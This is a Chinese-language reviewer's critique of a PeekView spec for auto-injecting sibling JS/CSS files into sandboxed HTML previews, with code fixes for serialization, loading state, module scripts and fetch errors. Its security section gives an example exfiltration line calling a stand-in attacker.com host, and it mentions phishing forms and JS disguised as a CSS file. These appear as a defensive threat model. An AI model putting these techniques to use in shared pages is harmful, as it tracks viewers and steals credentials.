# spec-html-multi-file-inject v1.1 — 专家评审

> Reviewer: Independent Reviewer (Architecture / Security / Product)
> Date: 2026-05-18
> Subject: `docs/specs/spec-html-multi-file-inject.md` v1.1

---

## 总体结论

**方向正确，核心方案可行，但有 2 个实现阶段必然踩到的坑 spec 没有说清楚，建议在动工前修掉。** 另外发现 1 个安全风险被误判为"无风险"，需要补充说明。

| 级别 | 数量 |
|------|------|
| 🔴 CRITICAL | 1 |
| 🟠 HIGH | 2 |
| 🟡 MEDIUM | 3 |
| 🟢 LOW | 2 |

---

## 🔴 CRITICAL-1：§3.6 安全评估"注入不增加安全风险"的结论是错的

**位置：** §3.6 安全性表格

**问题：**

spec 写道：

> 注入内容来源：同条目文件，用户自己上传的内容，信任级别与主 HTML 一致

> 结论：注入不增加安全风险。已有 sandbox 保障。

**这个结论在多用户场景下不成立。**

设想以下场景：

1. 用户 A 上传了一个 entry，包含 `index.html` + `evil.js`
2. 用户 A 把这个 entry 设为 Public，分享链接给用户 B
3. 用户 B 打开链接，PeekView 自动 fetch `evil.js` 并注入 `index.html`
4. `evil.js` 在 iframe sandbox 内执行

**问题的关键不是 sandbox 隔离是否有效，而是"自动 fetch + 自动注入"改变了信息流：**

- 当前行为：用户 B 打开 HTML 文件，看到渲染结果，如果想看 `evil.js` 内容，需要主动切换到该文件
- 注入后行为：用户 B 打开 HTML 文件，`evil.js` 自动被下载、解析、执行，用户 B 完全无感知

sandbox 确实阻止了 `evil.js` 访问父页面的 cookie/DOM，但 **`evil.js` 仍然可以在 iframe 内做很多事**：

- `fetch('https://attacker.com/beacon?u='+document.referrer)` — 遥测/追踪
- 展示钓鱼 UI（在 iframe 内伪造登录表单）
- 消耗大量 CPU/内存（对用户 B 的设备 DoS）
- `allow-popups` 已被砍掉，但如果未来有人以某种理由加回来，立刻升级为跳转攻击

**与当前 HTML 渲染的差异：**

当前用户 A 上传的 `index.html` 里如果有 `<script>alert(1)</script>`，这段代码会在 sandbox 里执行——这是已接受的风险，spec-html-render 里讨论过。

但注入方案额外引入的是：**用户 B 打开 index.html 时，同条目内所有文本文件都会被自动 fetch 并执行，即使用户 B 没有主动点击那些文件。** 攻击者可以把恶意代码放在一个起无害名字的文件里（`styles.css` 但内容是 JS），让 HTML 去 `<link href="styles.css">` 引用它。

**修复建议（二选一）：**

**A（推荐）：维持结论"已知风险，接受"，但补充完整的风险说明**

在 §3.6 替换为：

> **注入内容的执行风险（已知，接受）**
>
> 自动注入会在用户打开 HTML 文件时，下载并执行同条目内所有被引用的文本文件。对于 public entry，这意味着上传者的任意 JS 文件会在访客设备上的 sandbox 内自动执行，访客无感知。
>
> 风险边界：sandbox `allow-scripts` 且不含 `allow-same-origin`/`allow-popups`/`allow-forms`，执行结果被隔离在 iframe 内，无法访问父页面 cookie/DOM，无法发起顶层导航。已接受风险：iframe 内仍可发起外部 fetch（遥测/追踪）、消耗 CPU、展示任意 UI。
>
> 此风险与"用户 A 的 HTML 内已有 `<script>` 标签"在本质上相同，PeekView 的定位是代码/文件分享工具，查看他人内容本身即意味着接受该风险。

**B（更保守）：加一个"是否自动注入"的用户确认**

在 public entry 场景下，第一次加载多文件 HTML 时，显示提示：
> "此页面引用了 N 个同条目文件（app.js, styles.css），是否允许自动加载这些文件？"

成本更高，体验折损，但风险更低。如果 PeekView 未来面向企业/安全敏感场景，值得考虑。

**最低要求：§3.6 必须补充这段风险说明，不能用"信任级别与主 HTML 一致"一句话带过。**

---

## 🟠 HIGH-1：`doc.documentElement.outerHTML` 会丢失 DOCTYPE，且可能丢失 `<html>` 标签上的属性

**位置：** §4.1 注入函数 / §6.1 已知限制

**问题：**

spec 在 §6.1 已知限制里提到"outerHTML 丢失 DOCTYPE，对渲染无实质影响"。这个判断**对 CSS 是对的，对 JS 可能是错的**：

1. **DOCTYPE 影响浏览器渲染模式。** 没有 `<!DOCTYPE html>` 时，某些浏览器进入 quirks mode，盒模型、`width`/`height` 计算等行为不同。Agent 生成的 HTML 通常有 `<!DOCTYPE html>`，注入后丢失，可能导致样式渲染与预期不符——用户会认为是 Agent 生成的代码有问题。

2. **`<html lang="zh">` 等属性会被丢失吗？** `doc.documentElement.outerHTML` 包含 `<html>` 标签本身，所以 `lang` 等属性**不会丢失**，只有 DOCTYPE 丢失。

3. **正确的序列化方式：**

```typescript
function serializeDocument(doc: Document): string {
  const doctype = doc.doctype
  const doctypeStr = doctype
    ? `<!DOCTYPE ${doctype.name}>`
    : '<!DOCTYPE html>'  // 回退默认值
  return doctypeStr + '\n' + doc.documentElement.outerHTML
}
```

这是一个 5 行的修复，应该直接写进 §4.2 的实现代码里，而不是作为"已知限制，无实质影响"留着。

**修复建议：** §4.2 的 `injectResources` 返回值改为 `serializeDocument(doc)` 而不是 `doc.documentElement.outerHTML`，并在 §6.1 删掉这条"已知限制"。

---

## 🟠 HIGH-2：`siblingFiles` 传 `undefined` vs `[]` 区分"加载中"和"无兄弟文件"的设计脆弱

**位置：** §4.4 loading 态说明

**问题：**

spec 写道：

> 可通过 `siblingFiles` prop 为 `undefined`（未传）vs `[]`（已 fetch 完、无兄弟文件）来区分"正在加载"和"无兄弟文件"两种状态。

**用 prop 值的语义来隐式编码加载状态，是脆弱的设计**，原因：

1. `HtmlViewer` 的 prop 定义是 `siblingFiles?: SiblingFile[]`，`undefined` 是"未提供"的合法默认值，而不是"正在加载"的语义载体。任何使用这个组件的人（包括测试代码）在不了解这个约定时，会自然地不传 `siblingFiles`，然后发现组件 "意外" 地停在 Loading 态。

2. 如果将来有人重构 `EntryDetailView`，忘记了这个隐式约定，把初始值改成 `ref<SiblingFile[]>([])`，组件的 Loading 逻辑就悄悄失效了——在测试里也不容易发现。

**正确做法：用一个独立的 prop 或状态明确表达加载中：**

**方案 A（推荐）：加一个 `loadingSiblings` prop**

```typescript
const props = defineProps<{
  content: string
  siblingFiles?: SiblingFile[]
  loadingSiblings?: boolean  // 明确语义
}>()
```

HtmlViewer 内部：当 `loadingSiblings` 为 true 时显示 Loading 态，否则直接用 `siblingFiles ?? []` 渲染。

**方案 B：把 loading 状态提升到 store，HtmlViewer 不感知**

EntryDetailView 在 `isFetchingSiblings` 为 true 时，给 `HtmlViewer` 传 loading 状态，或者在 HtmlViewer 外层包一个 Loading 遮罩。HtmlViewer 始终收到完整的 `siblingFiles`，不需要区分 undefined 和 []。

这比方案 A 更彻底，但改动更大。

**建议采用方案 A**，修改量很小，语义清晰。

---

## 🟡 MEDIUM-1：`<script type="module">` 注入后的行为 spec 说明不够，实现者会搞错

**位置：** §3.5 / §4.2

**问题：**

spec 写了：

> `type="module"` 的已知限制：注入后变为 inline module，`import './utils.js'` 等内部相对路径引用仍无法解析

但 §4.2 的实现代码里：

```typescript
if (type) inline.setAttribute('type', type)
```

**也就是说，`type="module"` 的 script 会被注入为 `<script type="module">inline content</script>`。**

Inline `<script type="module">` 是合法的，但它有一个鲜为人知的行为：**inline module 的 import.meta.url 是父文档的 URL，而不是文件本身的 URL**。对于 Blob URL iframe，这意味着 `import.meta.url` 是 `blob:null/xxx`，不是 `./app.js` 这样的路径，很多依赖 `import.meta.url` 做动态资源路径计算的 module 会行为异常。

更重要的是：如果 Agent 生成了 `main.js`（ESM module，里面有 `import { foo } from './utils.js'`），这个 `import` 语句在 inline module 里会触发相对于 blob URL 的网络请求，失败，但**不会有任何可见的错误提示**——页面可能什么都不显示，或者部分功能失效。

**建议：** 在 §3.5 补充：

> `type="module"` 内有 `import` 语句时，注入后这些 import 仍会失败（blob URL 无文件系统上下文）。**建议将 `type="module"` 的 script 排除在注入范围之外**（不替换节点，保留原 `<script src="..." type="module">`），这样行为更可预期：原节点保留 → 相对路径 404 → 计入警告条，而不是注入后静默失败。

修改 §4.2 对应判断：

```typescript
// type="module" 排除注入，让它 404 并计入警告，而非注入后静默失败
if (type && (type === 'module' || (type !== 'text/javascript' && type !== ''))) return
```

---

## 🟡 MEDIUM-2：并行 fetch 兄弟文件缺少错误处理策略

**位置：** §4.4 实现代码

**问题：**

```typescript
const results = await Promise.all(
  siblings.map(async f => ({
    filename: f.filename,
    language: f.language ?? '',
    content: await api.getFileContent(currentEntry.value!.slug, f.id),
  }))
)
```

`Promise.all` 是全有或全无：**任意一个文件 fetch 失败，整个 Promise.all 就 reject**，`siblingFilesContent` 永远不会被赋值（停留在 `[]`），HTML 会以无注入状态渲染，**没有任何提示告诉用户发生了什么**。

在以下情况下 fetch 会失败：网络抖动、文件被后端删除（条目局部更新）、large file timeout。

**修复建议：** 用 `Promise.allSettled` 替代：

```typescript
const settled = await Promise.allSettled(
  siblings.map(async f => ({
    filename: f.filename,
    language: f.language ?? '',
    content: await api.getFileContent(currentEntry.value!.slug, f.id),
  }))
)

const results = settled
  .filter((r): r is PromiseFulfilledResult<SiblingFile> => r.status === 'fulfilled')
  .map(r => r.value)

const failedCount = settled.filter(r => r.status === 'rejected').length
if (failedCount > 0) {
  // toast 或警告条："N 个资源文件加载失败，部分引用无法注入"
}

siblingFilesContent.value = results
```

这样单个文件失败不影响其他文件的注入，用户也能感知到问题。

---

## 🟡 MEDIUM-3：`normalizeRef` 排除 `/` 开头路径的注释说明不够

**位置：** §3.4 normalizeRef 实现

**问题：**

```typescript
// 排除路径绝对引用：/absolute/path.css（会请求服务器根路径，不是相对引用）
if (trimmed.startsWith('/')) return null
```

注释说"会请求服务器根路径"，但在 Blob URL iframe 的上下文里，`/absolute/path.css` 实际上会请求 `blob:null/absolute/path.css`（或 `blob:http://127.0.0.1:8888/absolute/path.css`），而不是 PeekView 服务器根路径——Blob URL 没有"服务器根路径"的概念，这个请求必然 404。

注释不影响代码逻辑（排除 `/` 开头的路径是正确的），但会误导维护者。

**修复建议：** 改为：

```typescript
// 排除绝对路径（以 / 开头），在 Blob URL 上下文中无法解析，不做注入
if (trimmed.startsWith('/')) return null
```

---

## 🟢 LOW-1：§4.3 的"方案"描述不精确，实现者可能误解

**位置：** §4.3

**问题：**

> **方案**：注入完成后，对处理过的 HTML（`<link>` 已替换为 `<style>`）重新运行 `relativePathCount` 检测。

这句话暗示"先注入 HTML，再用注入后的 HTML 做 DOMParser 检测"。但 `relativePathCount` 是一个基于 `props.content`（原始 HTML）的 computed，而注入逻辑在 `initRender` 里产生中间变量——两者不共享数据。

需要明确说清楚：注入后的 HTML 是一个**局部变量**（在 `initRender` 内），`relativePathCount` 需要**重新设计为基于注入后 HTML 的计算**，或者改为在注入函数里返回"剩余未注入的引用数量"作为副产品。

**建议的明确写法：**

> `injectResources` 同时返回注入后 HTML 和剩余未匹配的引用数量：
> ```typescript
> function injectResources(html, siblings): { html: string, unmatchedCount: number }
> ```
> `relativePathCount` 改为使用 `unmatchedCount`（来自注入函数），而不是 DOMParser 重新解析。

这样逻辑在一处完成，避免两次 DOMParser 解析（性能），也避免状态不一致。

---

## 🟢 LOW-2：§5 测试计划缺少并发切换场景

**位置：** §5.2 E2E 测试

**问题：**

用户快速切换文件时，前一个 HTML 文件的 `Promise.all`（fetch 兄弟文件）可能还没完成，`activeFile` 已经切换到了下一个文件。此时如果 promise resolve，`siblingFilesContent` 会被覆盖为上一个文件的兄弟文件内容。

这是一个经典的竞态条件。§4.4 的 watch 实现里有 `siblingFilesContent.value = []`（每次切换时先清空），但没有 AbortController / 版本号来取消前一次 fetch。

**建议：** §5 加一个测试用例：

> 快速切换（先切到 HTML 文件，立刻切到非 HTML 文件，再切回 HTML 文件）：最终显示的注入内容应属于最后那次 HTML 文件，不出现上一次的残留数据。

同时 §4.4 实现部分应提示：考虑用 AbortController 或 incrementing request token 防止竞态。

---

## 总结与修改建议

| 编号 | 级别 | 位置 | 核心建议 |
|------|------|------|---------|
| CRITICAL-1 | 🔴 | §3.6 | 补充完整的安全风险说明，"注入不增加风险"结论不成立 |
| HIGH-1 | 🟠 | §4.2 / §6.1 | 修复 DOCTYPE 丢失：用 `serializeDocument` 替代 `outerHTML` |
| HIGH-2 | 🟠 | §4.4 | `siblingFiles undefined vs []` 编码加载状态脆弱，改用 `loadingSiblings` prop |
| MEDIUM-1 | 🟡 | §3.5 / §4.2 | `type="module"` 排除注入，避免静默失败 |
| MEDIUM-2 | 🟡 | §4.4 | `Promise.all` 改为 `Promise.allSettled`，单文件失败不影响其他文件 |
| MEDIUM-3 | 🟡 | §3.4 | 修正 normalizeRef 注释，说明在 Blob URL 上下文中的实际行为 |
| LOW-1 | 🟢 | §4.3 | `injectResources` 返回 `unmatchedCount`，避免两次 DOMParser |
| LOW-2 | 🟢 | §5 | 加竞态场景测试，§4.4 提示 AbortController |

**动工前必须修的：** CRITICAL-1、HIGH-1、HIGH-2、MEDIUM-1、MEDIUM-2。这 5 项都是会在实现阶段直接踩到的坑，或在上线后被发现的安全/产品问题，修改成本在 spec 阶段最低。
